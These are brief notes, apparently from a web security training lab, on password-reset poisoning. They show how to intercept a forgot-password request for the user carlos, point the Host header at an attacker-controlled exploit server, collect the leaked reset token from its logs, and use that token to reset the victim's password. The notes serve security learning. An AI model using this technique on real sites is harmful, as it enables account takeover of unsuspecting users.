/*

1) Put a username, forgot password, read the mail, click the link with the token
   set the new password, login

2) Intercept the POST /forgot-password request, set the username to carlos
    change the Host to 
    Host: exploit-0a9d00eb03e139c6835dcddb01810026.exploit-server.net
    https://exploit-0a9d00eb03e139c6835dcddb01810026.exploit-server.net/exploit
3) send the request and check the exploit server access logs for the reset token
    j52ktqtutxthg1pp23ewkakhaxa3k6av

4) GET /forgot-password?temp-forgot-password-token=j52ktqtutxthg1pp23ewkakhaxa3k6av 
// modify the token value and send to reset carlos' password

*/